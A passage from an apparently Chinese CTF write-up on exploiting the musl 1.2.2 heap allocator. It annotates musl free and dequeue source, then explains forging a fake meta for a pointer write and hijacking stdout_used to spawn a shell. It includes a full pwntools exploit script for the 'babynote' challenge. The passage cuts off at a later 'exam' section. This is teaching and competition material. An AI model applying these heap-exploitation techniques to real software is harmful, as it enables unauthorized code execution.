i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line">    <span class="comment">//进入这个条件的情况有两种</span></span><br><span class="line">    <span class="comment">//1:只有一个chunk被分配且这个chunk正是要被free的chunk</span></span><br><span class="line">    <span class="comment">//2:除了一个chunk其余全被free,q且这个chunk正是要被free的chunk</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (struct mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">okay_to_free</span><span class="params">(struct meta *g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="comment">//freeable=1根据源码 代表meta否可以被回收 freeable=0 代表不可以 =1 代表可以</span></span><br><span class="line">	<span class="keyword">if</span> (!g-&gt;freeable) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (sc &gt;= <span class="number">48</span> || get_stride(g) &lt; UNIT*size_classes[sc])</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (!g-&gt;maplen) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//要fake_meta完成指针互相，那这个条件天然满足</span></span><br><span class="line">	<span class="keyword">if</span> (g-&gt;next != g) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (!is_bouncing(sc)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">size_t</span> cnt = g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">9</span>*cnt &lt;= usage &amp;&amp; cnt &lt; <span class="number">20</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数会检查chunk,group,meta和meta_area结构体，比较重要</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct meta *<span class="title">get_meta</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	assert(!((<span class="keyword">uintptr_t</span>)p &amp; <span class="number">15</span>));<span class="comment">//十六字节对齐</span></span><br><span class="line">	<span class="comment">//获取slot的偏移offset,offset*0x10是真实偏移</span></span><br><span class="line">	<span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="comment">//获取这个slot的idx</span></span><br><span class="line">	<span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line">			<span class="comment">//检查chunk的往前数第四个字节是否为0，不为0抛出异常</span></span><br><span class="line">		<span class="comment">//这个字节是判断chunk是否被溢出的标志位。</span></span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//通过offset获取group的首地址</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - <span class="number">0x10</span>*offset - <span class="number">0x10</span>);</span><br><span class="line">	<span class="comment">//获取meta地址，group的前八个字节是指向meta结构的地址</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	<span class="comment">//如果这个chunk没有被使用就分配就会抛出异常</span></span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="comment">//如果这个chunk被free过再进行free就会抛出异常</span></span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="comment">//通过meta得到meta_area</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	<span class="comment">//对这个meta_area进行检查</span></span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (struct meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完成指针互写的关键函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x1.2 利用思路</p>
<p>1.在free的时候dequeue函数脱链检查不严格，可以利用这一点伪造meta进行指针互写</p>
<p>2.在完成第一步以后,被伪造的meta就会被free掉，下次malloc申请meta的时候queue就会申请到fak)meta,所以可以结合dequeue和queue进行任意地址申请</p>
<p>3.一般的攻击目标就是io结构，也就是fsop,只要能控制stdout stdin或者stderr其中一个结构体，令其flags为’/bin/sh’，write指针为’system’就可以完成getshell,究其原因就是exit会对io结构进行清理，代码如下,当然也可以控制std_uesd,这样只需要一次指针互写就可以做到，对io_file进行控制则比较麻烦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">weak_alias(libc_exit_fini, __libc_exit_fini);</span><br><span class="line"></span><br><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __stdio_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close_file</span><span class="params">(FILE *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x2-babynote"><a href="#0x2-babynote" class="headerlink" title="0x2 babynote"></a>0x2 babynote</h2><p>就是利用stdout_used完成getshell,本来已经可以申请到io_file了，但是calloc会清零，破坏io_file,也没看懂官方wp是怎么绕过的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh= process([<span class="string">&quot;/home/rootzhang/musl/musl-1.2.2/build/lib/libc.so&quot;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"><span class="comment">#sh=remote(&quot;123.60.76.240&quot;,60001)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name_size,name,note_size,note</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;note size: &quot;</span>,<span class="built_in">str</span>(note_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;note content: &quot;</span>,note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">name_size,name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">name_size, name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;name size: &quot;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;name: &quot;</span>, name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forget</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot;b *(0x7ffff7ff0000+0x1679)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;1\n&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;2\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;3\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;4\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;4\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;5\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;5\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">    forget()</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;6\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;7\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;7\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;6\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;8\n&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;8\n&#x27;</span>)</span><br><span class="line">    find(<span class="number">0x40</span>,<span class="string">&#x27;6\n&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;0x28:&quot;</span>)</span><br><span class="line">    m=sh.recv(<span class="number">12</span>)</span><br><span class="line">    libc_addr=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        libc_addr+=m[(<span class="number">5</span>-i)*<span class="number">2</span>]+m[<span class="number">2</span>*(<span class="number">5</span>-i)+<span class="number">1</span>]</span><br><span class="line">    libc_base=<span class="built_in">int</span>(libc_addr,<span class="number">16</span>)-<span class="number">0xcb0</span>+<span class="number">0x1000</span></span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;8\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;7\n&#x27;</span>)</span><br><span class="line">    forget()</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x09\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x09&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0b\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x0b\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x09\n&#x27;</span>)</span><br><span class="line">    malloc_content=libc_base+<span class="number">0x1aa0</span></span><br><span class="line">    fake_content=p64(libc_base-<span class="number">0x1000</span>+<span class="number">0x50</span>)+p64(malloc_content)+p64(<span class="number">1</span>)+p64(<span class="number">0x28</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0c\n&#x27;</span>,<span class="number">0x28</span>,fake_content)</span><br><span class="line">    find(<span class="number">0x40</span>,<span class="string">&#x27;\x00\n&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;0x28:&quot;</span>)</span><br><span class="line">    m=sh.recv(<span class="number">16</span>)</span><br><span class="line">    check=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        check+=m[(<span class="number">7</span>-i)*<span class="number">2</span>]+m[<span class="number">2</span>*(<span class="number">7</span>-i)+<span class="number">1</span>]</span><br><span class="line">    check=<span class="built_in">int</span>(check,<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0c\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0b\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0d\n&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;\x0d\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0e\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x0e\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0d\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0e\n&#x27;</span>)</span><br><span class="line">    forget()</span><br><span class="line">    fake_mem_addr=libc_base-<span class="number">0xc000</span>+<span class="number">0x1000</span>+<span class="number">0x40</span></span><br><span class="line">    fake_meta_addr=libc_base-<span class="number">0xc000</span>+<span class="number">0x1000</span>+<span class="number">0x10</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0f\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x0f\n&#x27;</span>)</span><br><span class="line">    stdout_addr=libc_base+<span class="number">0x12e0</span></span><br><span class="line">    stderr_addr=libc_base+<span class="number">0x10e0</span></span><br><span class="line">    stdout_use_addr=libc_base+<span class="number">0x1410</span></span><br><span class="line">    execve_addr=libc_base-<span class="number">0x259323</span></span><br><span class="line">    sc = <span class="number">8</span></span><br><span class="line">    freeable = <span class="number">1</span></span><br><span class="line">    last_idx = <span class="number">0</span></span><br><span class="line">    maplen = <span class="number">1</span></span><br><span class="line">    fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    fake_meta += p64(fake_mem_addr+<span class="number">0x10</span>) <span class="comment"># prev</span></span><br><span class="line">    fake_meta += p64(stdout_use_addr) <span class="comment"># next</span></span><br><span class="line">    fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">    fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">    fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">    fake_meta += p64(<span class="number">0</span>)</span><br><span class="line">    fake_mem=p64(fake_meta_addr)</span><br><span class="line">    fake_mem += p32(<span class="number">1</span>)</span><br><span class="line">    fake_mem += p32(<span class="number">0</span>)</span><br><span class="line">    fake_io=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>+p64(<span class="number">0xdeadbeef</span>) + <span class="string">&#x27;x&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xbeefdead</span>)+p64(execve_addr) + p64(execve_addr)</span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">0x20</span>)</span><br><span class="line">    payload+=p64(check)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=fake_meta</span><br><span class="line">    payload+=fake_mem</span><br><span class="line">    payload+=fake_io</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x10\n&#x27;</span>,<span class="number">0x2000</span>,payload.ljust(<span class="number">0x2000</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x11\n&#x27;</span>,<span class="number">0x2000</span>,<span class="string">&#x27;\x11\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0f\n&#x27;</span>)</span><br><span class="line">    fake_content=p64(libc_base+<span class="number">0x48e0</span>+<span class="number">0x10</span>)+p64(fake_mem_addr+<span class="number">0x10</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x28</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x12\n&#x27;</span>,<span class="number">0x28</span>,fake_content)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x35\n&#x27;</span>)</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    <span class="comment"># free(0x40,&#x27;\x10\n&#x27;)</span></span><br><span class="line">    <span class="comment"># add(0x40,&#x27;\x13\n&#x27;,0x80,&#x27;a\n&#x27;)</span></span><br><span class="line">    <span class="comment"># sc = 8</span></span><br><span class="line">    <span class="comment"># last_idx=1</span></span><br><span class="line">    <span class="comment"># payload=&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># payload+=&#x27;\x00&#x27;*(0x1000-0x20-0x10)</span></span><br><span class="line">    <span class="comment"># payload+=p64(check)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload+=p64(fake_meta_addr)+p64(fake_meta_addr)</span></span><br><span class="line">    <span class="comment"># payload+=p64(stdout_addr-0x20-0x20)</span></span><br><span class="line">    <span class="comment"># payload+=p32(1) + p32(0)</span></span><br><span class="line">    <span class="comment"># payload+=p64((sc &lt;&lt; 6) | last_idx)</span></span><br><span class="line">    <span class="comment"># add(0x40,&#x27;\x14\n&#x27;,0x2000,payload+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># add(0x40,&#x27;\x15\n&#x27;,0x80,&#x27;ssss\n&#x27;)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x3-exam"><a href="#0x3-exam" class="headerlink" title="0x3 exam"></a>0x3 exam</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 